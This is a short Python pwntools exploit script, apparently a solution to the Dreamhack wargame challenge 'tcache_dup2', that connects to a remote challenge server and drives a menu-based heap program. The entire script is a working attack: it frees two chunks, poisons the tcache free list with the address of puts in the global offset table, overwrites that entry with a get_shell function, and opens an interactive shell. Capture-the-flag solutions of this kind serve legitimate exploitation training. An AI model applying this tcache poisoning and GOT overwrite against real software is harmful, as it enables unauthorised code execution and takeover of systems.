from pwn import *

REMOTE = True
e = ELF('./tcache_dup2')
if not REMOTE:
    r = process('./tcache_dup2')
else:
    r = remote('host3.dreamhack.games', 9258)

sla = r.sendlineafter
sa = r.sendafter


def Create(size, data):
    sla('> ', '1')
    sla('Size: ', str(size))
    sa('Data: ', data)

def Modify(idx, size, data):
    sla('> ', '2')
    sla('idx: ', str(idx))
    sla('Size: ', str(size))
    sa('Data: ', data)

def Delete(idx):
    sla('> ', '3')
    sla('idx: ', str(idx))


puts_got = e.got['puts'] 
get_shell = e.symbols['get_shell']

Create(0x18, 'a')
Create(0x18, 'a')
Delete(0)
Delete(1)
Modify(1, 0x8, p64(puts_got))
Create(0x18, 'a')
Create(0x18, p64(get_shell))

r.interactive()
